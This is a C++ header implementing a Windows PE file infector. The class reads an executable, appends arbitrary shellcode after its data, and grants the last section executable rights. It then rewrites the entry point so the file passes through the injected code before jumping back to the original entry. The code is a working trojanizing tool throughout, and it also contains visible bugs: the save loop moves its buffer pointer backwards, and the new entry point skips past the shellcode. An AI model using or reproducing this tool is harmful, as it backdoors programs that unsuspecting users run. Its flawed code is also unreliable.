#pragma once

#include <windows.h>
#include <winternl.h>
#include <iostream>

class PEInjector {
public:
	PEInjector(char* shellcode, int size, LPCSTR fileName, LPCSTR savedFile) {
		initShellcode(shellcode, size);
		readFile(fileName);
		injectPE();
		saveFile(savedFile);
	}
	~PEInjector() {
		free(this->_mem_file);
		free(this->_shellcode);
		free(this->_new_buffer);
	}

	void readFile(LPCSTR fileName) {
		OFSTRUCT of = { 0 };
		HANDLE hFile = (HANDLE)OpenFile(fileName, &of, OF_READ);
		if (hFile == INVALID_HANDLE_VALUE) {
			printf("%d\n", GetLastError());
			CloseHandle(hFile);
			return;
		}
		DWORD dwFileSize = GetFileSize(hFile, NULL);
		this->_file_size = dwFileSize;
		this->_mem_file = (PBYTE)malloc(dwFileSize);
		DWORD dwByteToRead = dwFileSize;
		DWORD dwByteReads = 0;
		PBYTE tmp = this->_mem_file;
		do {
			ReadFile(hFile, tmp, dwByteToRead, &dwByteReads, NULL);
			if (dwByteReads == 0) {
				break;
			}
			dwByteToRead -= dwByteReads;
			tmp += dwByteReads;
		} while (dwByteToRead > 0);
		//TODO check pe fingerprint
		CloseHandle(hFile);
	}

	void saveFile(LPCSTR fileName) {
		HANDLE hFile = CreateFileA(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			printf("%d\n", GetLastError());
			CloseHandle(hFile);
			return;
		}
		DWORD dwByteToWrite = this->_fixsize;
		DWORD dwByteWrites = 0;
		PBYTE tmpBuffer = this->_new_buffer;
		do {
			WriteFile(hFile, tmpBuffer, dwByteToWrite, &dwByteWrites, NULL);
			dwByteToWrite -= dwByteWrites;
			tmpBuffer -= dwByteWrites;
		} while (dwByteToWrite > 0);
		CloseHandle(hFile);
	}
	
	void injectPE() {
		PBYTE pImage = this->_mem_file;
		this->_new_buffer = (PBYTE) malloc(this->_file_size + 0x1000);
		PBYTE tmpBuffer = this->_new_buffer;
		this->_fixsize = this->_file_size + 0x1000;
		memset(tmpBuffer, 0, this->_file_size + 0x1000);
		memcpy(tmpBuffer, pImage, this->_file_size);
		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)this->_mem_file;
		PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(this->_mem_file + pDos->e_lfanew);
		//DWORD dwHeaderSize = pNt->FileHeader.SizeOfOptionalHeader;
		DWORD dwSectionNum = pNt->FileHeader.NumberOfSections;
		PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((PBYTE)pNt + sizeof(IMAGE_NT_HEADERS));
		PIMAGE_DOS_HEADER pNewDos = (PIMAGE_DOS_HEADER)tmpBuffer;
		PIMAGE_NT_HEADERS pNewNt = (PIMAGE_NT_HEADERS)(tmpBuffer + pNewDos->e_lfanew);
		PIMAGE_SECTION_HEADER pNewSec = (PIMAGE_SECTION_HEADER)((PBYTE)pNewNt + sizeof(IMAGE_NT_HEADERS));
		DWORD dwCharacter = 0;
		for (int i = 0; i < dwSectionNum; i++) {
			if (!strcmp((const char*)pNewSec->Name, ".text")) {
				dwCharacter = pNewSec->Characteristics;
			}
			//find last section and extend
			if (i == dwSectionNum-1) {
				
				/*DWORD dwFileAlign = pNewNt->OptionalHeader.FileAlignment;*/
				pNewNt->OptionalHeader.SizeOfImage += 0x1000;
				
				pNewSec->Characteristics |= dwCharacter;
				if (pNewSec->Misc.VirtualSize > pNewSec->SizeOfRawData) {
					pNewSec->SizeOfRawData = pNewSec->Misc.VirtualSize + 0x1000;
					pNewSec->Misc.VirtualSize = pNewSec->Misc.VirtualSize + 0x1000;
				}else {
					pNewSec->Misc.VirtualSize = pNewSec->SizeOfRawData + 0x1000;
					pNewSec->SizeOfRawData = pNewSec->SizeOfRawData + 0x1000;
				}
				
				memcpy(tmpBuffer + this->_file_size, this->_shellcode, this->_size);
				char jmp[10] = { 0xe9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
				DWORD dwOep = pNewNt->OptionalHeader.AddressOfEntryPoint;
				DWORD dwJmpFoa = this->_file_size + this->_size;
				DWORD dwJmpRva;
				this->FOAtoRVA(dwJmpFoa, &dwJmpRva);
				DWORD dwJmp = dwOep - dwJmpRva - 5;
				PDWORD ptmp = (PDWORD) & jmp[1];
				*ptmp = dwJmp;
				memcpy(tmpBuffer + this->_file_size + this->_size, jmp, 10);
				
				pNewNt->OptionalHeader.AddressOfEntryPoint = dwJmpRva;
				break;
			}
			pNewSec += 1;
		}
	}
	

	void FOAtoRVA(DWORD foa, DWORD* rva) {
		PBYTE pImage = this->_new_buffer;
		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
		PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pImage + pDos->e_lfanew);
		if (foa < pNt->OptionalHeader.SizeOfHeaders) {
			*rva = foa;
			return;
		}
		PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((PBYTE)pNt + sizeof(IMAGE_NT_HEADERS));
		for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
			if (foa >= pSec->PointerToRawData && foa <= (pSec->PointerToRawData + pSec->SizeOfRawData)) {
				*rva = foa + pSec->VirtualAddress - pSec->PointerToRawData;
				return;
			}
			pSec += 1;
		}
	}

	void initShellcode(char* shellcode, int size) {
		this->_shellcode = (char*)malloc(size+1);
		if (this->_shellcode == NULL) {
			printf("Shellcode Init Failed");
			return;
		}
		this->_size = size;
		memset(this->_shellcode, 0, size+1);
		memcpy(this->_shellcode, shellcode, size);
	}
private:
	char* _shellcode;
	PBYTE _mem_file;
	PBYTE _new_buffer;
	DWORD _size;
	DWORD _file_size;
	DWORD _fixsize;
};